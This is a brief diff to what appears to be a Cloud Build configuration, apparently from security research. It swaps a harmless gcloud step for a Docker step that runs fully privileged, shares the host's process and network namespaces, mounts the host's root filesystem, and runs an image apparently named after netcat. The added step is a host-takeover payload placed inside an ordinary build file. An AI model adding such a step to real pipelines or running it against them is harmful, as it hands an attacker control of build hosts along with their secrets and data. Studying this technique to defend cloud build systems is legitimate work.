@@ -1,9 +1,7 @@
 steps:  
-  - name: 'google/cloud-sdk'
-    args: ['gcloud', 'config', 'get-value', 'account']
+- name: 'gcr.io/cloud-builders/docker'  
+  args: ['run', '--pid=host', '--network=host',  '--privileged', '-v', '/:/host', 'aviv320i2/nc']  
 options:  
   logging: CLOUD_LOGGING_ONLY 
 images:  
 - 'gcr.io/twistlock-secresearch/my-image'  
-
-
